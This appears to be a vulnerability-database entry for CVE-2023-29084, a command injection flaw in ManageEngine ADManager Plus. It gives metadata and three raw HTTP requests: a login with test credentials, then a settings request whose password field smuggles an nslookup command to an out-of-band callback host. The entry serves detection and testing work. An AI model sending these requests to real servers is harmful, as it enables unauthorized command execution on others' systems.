---
layout: post
cve_id: CVE-2023-29084
title: ManageEngine ADManager Plus - Command Injection
pcap: true
pcap_path: /pcaps/2023/CVE-2023-29084.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-29084.yaml
snort2_rule: N/A
snort3_rule: N/A
author: rootxharsh,iamnoooob,pdresearch
severity: high
impact: 'Successful exploitation of this vulnerability could lead to remote code execution,
  unauthorized access to sensitive information, or complete compromise of the target
  system.

  '
remediation: 'Apply the latest security patch or update provided by the vendor to
  fix the command injection vulnerability in ManageEngine ADManager Plus.

  '
reference:
- https://hnd3884.github.io/posts/CVE-2023-29084-Command-injection-in-ManageEngine-ADManager-plus/
- https://community.grafana.com/t/release-notes-v6-3-x/19202
- http://packetstormsecurity.com/files/172755/ManageEngine-ADManager-Plus-Command-Injection.html
- https://manageengine.com
- https://www.manageengine.com/products/ad-manager/admanager-kb/cve-2023-29084.html
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 7.2
  cve-id: CVE-2023-29084
  cwe-id: CWE-77
  epss-score: 0.93878
  epss-percentile: 0.99863
  cpe: cpe:2.3:a:zohocorp:manageengine_admanager_plus:*:*:*:*:*:*:*:*
metadata:
  max-request: 3
  vendor: zohocorp
  product: manageengine_admanager_plus
tags:
- cve
- cve2023
- packetstorm
- manageengine
- admanager
- rce
- oast
- authenticated
- zohocorp
- vuln
---

## üîç Vulnerability Description
Zoho ManageEngine ADManager Plus through 7180 allows for authenticated users to exploit command injection via Proxy settings.


## üåê HTTP Request
```nohighlight
POST /j_security_check HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Connection: close
Content-Length: 135
Content-Type: application/x-www-form-urlencoded
Origin: http://www.victim.com
Referer: http://www.victim.com
Accept-Encoding: gzip

is_admp_pass_encrypted=false&j_username=4QyzxF&j_password=Lojsz1&domainName=ADManager+Plus+Authentication&AUTHRULE_NAME=ADAuthenticator
```

```nohighlight
GET /home.do HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /api/json/admin/saveServerSettings HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
Connection: close
Content-Length: 203
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://www.victim.com
Referer: http://www.victim.com
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

params=[{"tabId":"proxy","ENABLE_PROXY":true,"SERVER_NAME":"1.1.1.1","USER_NAME":"random","PASSWORD":"asd\r\nnslookup.exe d5jkqk9le0o2bs1fielgjot4yzdp4xjox.oast.pro 1.1.1.1","PORT":"80"}]&admpcsrf=mEwgAA
```

